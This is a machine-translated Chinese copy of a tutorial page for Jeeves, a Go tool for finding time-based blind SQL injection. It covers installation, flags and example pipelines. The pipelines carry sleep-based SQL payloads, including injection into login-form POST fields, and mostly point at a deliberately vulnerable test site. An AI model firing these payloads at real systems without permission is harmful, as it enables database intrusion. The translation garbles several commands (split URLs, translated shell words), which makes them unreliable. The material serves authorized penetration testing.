# Jeeves:基于时间的盲 SQLInjection Finder

> 原文：<https://kalilinuxtutorials.com/jeeves/>

[![](img/c26b736a6e2ac76f60d1adbc92f58e03.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4m3-iHvwR142XT3M8V30YCjXaWEXiVK5FUy7tCr2iuC17Ko5Vx2j5eR2KW-y_AdK2-Lw1JPm7-9_R2452fJU-IJ6yvudsAPhIqymzJVeDckeq5ADEob9QSJpdZ057Q2U7nQ_SSveMN11wFr8D2c1FRo6cMdvy0z8DVAU5D6u9qLCUjsCUO06S40An/s801/gojayyyy%20(2).png)

Jeeves 是为通过 recon 寻找基于时间的盲 SQL 注入而设计的。

## 安装和要求

安装 Jeeves

**$去安装 github.com/ferreiraklet/Jeeves@latest**

运筹学

**git 克隆 https://github . com/ferre raklet/jeeves . git
$ CD jeeves
$ go build jeeves . go
$ chmod+x jeeves
$。/jeeves-h〔t5〕**

## 用法和解释

## 单一 URL

**附和'https://redacted.com/index.php？id = your _ time _ based _ blind _ payload _ here ' | jeeves-t payload _ time
echo "http://testphp.vulnweb.com/artists.php？artist = " | QS replace "(select(0)from(select(sleep(5)))v)" | jeeves–payload-time 5【回声"http://testphp.vulnweb.com/artists.php T2？artist = " | QS replace "(select(0)from(select(sleep(10)))v)" | jeeves-t 10**

在有效负载时间内，您必须使用有效负载中提到的时间

### 从列表中

`**cat targets | jeeves --payload-time 5**`

### 添加标题

注意语法！必须相同= >

**附和"http://testphp.vulnweb.com/artists.php？artist = " | QS replace "(select(0)from(select(sleep(5)))v)" | jeeves-t 5-H "测试:测试；OtherHeader:值；其他 2:值"**

## 使用代理

**附和"http://testphp.vulnweb.com/artists.php？artist = " | QS replace "(select(0)from(select(sleep(5)))v)" | jeeves-t 5–proxy " http://IP:port "
echo "http://testphp.vulnweb.com/artists.php？artist = " | QS replace "(select(0)from(select(sleep(5)))v)" | jeeves-t 5-p " http://IP:port "**

## 代理+头= >

**附和"http://testphp.vulnweb.com/artists.php？artist = " | QS replace "(select(0)from(select(sleep(5)))v)" | jeeves–payload-time 5–proxy " http://IP:port "-H " User-Agent:xxxx "**

### 发布请求

通过 post 请求发送数据(登录表单等)

注意语法！必须相等！->

**echo " https://example . com/log in . aspx " | jeeves-t 10-d " user =(select(0)from(select(sleep(5)))v)&password = XXX "
echo " https://example . com/log in . aspx " | jeeves-t 10-H " header 1:value 1 "-d " username = admin&password = '+(select * from(select(sleep(5)))a)+'-p " http://your proxy:port "【关键词**

## 另一种用法

你可以使用 Jeeves 与其他工具，如 gau，gauplus，waybackurls，qsreplace 和 bhedak，掌握他的力量

**命令行标志**

**用法:
-t，–payload-time，从 payload 开始的时间
-p，–proxy 发送流量到一个代理
-c 设置并发，默认 25
-H，–Headers 自定义头
-d，–data 发送 Post 请求带数据
-h 显示此帮助消息**

与 sql 有效负载单词列表一起使用

**cat sql_wordlist.txt |在读取有效负载时；do echo http://testphp.vulnweb.com/artists.php?artist= | QS replace $ payload | jeeves-t 5；完成**

[Download](https://github.com/ferreiraklet/Jeeves)